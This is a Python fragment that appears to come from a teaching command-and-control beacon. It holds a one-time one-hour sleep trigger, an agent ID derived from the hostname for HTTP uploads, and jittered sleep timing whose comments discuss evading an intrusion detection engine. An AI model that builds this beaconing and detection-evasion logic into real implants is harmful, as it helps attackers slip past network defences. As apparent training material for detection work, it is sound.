_one_hour_sleep_done = False
_sleep_lock = threading.Lock()


def handle_z_one() -> tuple:
    """
    HandleZOne: should the agent enter a one-hour sleep?
    Returns (should_sleep: bool, duration: float).
    Once the hour has been slept, subsequent Z=1 triggers return False.
    """
    global _one_hour_sleep_done
    with _sleep_lock:
        if not _one_hour_sleep_done:
            _one_hour_sleep_done = True
            return True, 3600.0
        return False, 0.0


def reset_z_one_sleep() -> None:
    """Reset the one-hour sleep guard (for testing)."""
    global _one_hour_sleep_done
    with _sleep_lock:
        _one_hour_sleep_done = False


# ─────────────────────────────────────────────────────────────
#  AGENT ID
#  Stable per-host identifier derived from hostname.
#  Used as agent_id in HTTP uploads (fixes Spinnekop hardcoded IP).
# ─────────────────────────────────────────────────────────────

def derive_agent_id() -> str:
    """Derive a stable 8-char agent ID from hostname hash."""
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    h = hashlib.sha256(hostname.encode()).hexdigest()[:8].upper()
    return f"AGENT-{h}"


AGENT_ID: str = derive_agent_id()


# ─────────────────────────────────────────────────────────────
#  JITTER CALCULATION
# ─────────────────────────────────────────────────────────────

def jittered_sleep_duration() -> float:
    """
    Calculate sleep duration with jitter.
    Teaching point: bots with zero jitter have CV ≈ 0.01 (immediately
    detected by IDS Engine 2). Even 50% jitter is usually detectable.
    IDS detection drops significantly only above ~500ms eff. stddev.
    """
    jitter_range = DELAY_SEC * (JITTER_PCT / 100.0)
    min_sleep    = DELAY_SEC - jitter_range
    max_sleep    = DELAY_SEC + jitter_range
    return random.uniform(min_sleep, max_sleep)


